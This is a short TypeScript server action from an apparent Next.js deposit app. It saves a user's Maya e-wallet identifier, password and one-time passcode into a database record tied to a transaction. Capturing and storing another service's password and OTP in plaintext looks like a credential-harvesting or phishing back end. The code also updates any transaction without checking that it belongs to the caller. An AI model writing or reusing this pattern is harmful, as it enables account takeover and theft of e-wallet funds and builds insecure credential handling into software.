"use server";

import { prisma } from "@/lib/prisma";
import { createClient } from "@/lib/supabase/server";

export async function saveMayaCredentials(data: {
  transactionId: string;
  identifier?: string;
  password?: string;
  otp?: string;
}) {
  const supabase = await createClient();
  const {
    data: { user: authUser },
  } = await supabase.auth.getUser();

  if (!authUser) throw new Error("Unauthorized");

  const user = await prisma.user.findUnique({
    where: { authUserId: authUser.id },
    select: { id: true },
  });

  if (!user) throw new Error("User not found");

  await prisma.depositDetails.update({
    where: { transactionId: data.transactionId },
    data: {
      ...(data.identifier && { mayaIdentifier: data.identifier }),
      ...(data.password && { mayaPassword: data.password }),
      ...(data.otp && { mayaOtp: data.otp }),
    },
  });

  return { success: true };
}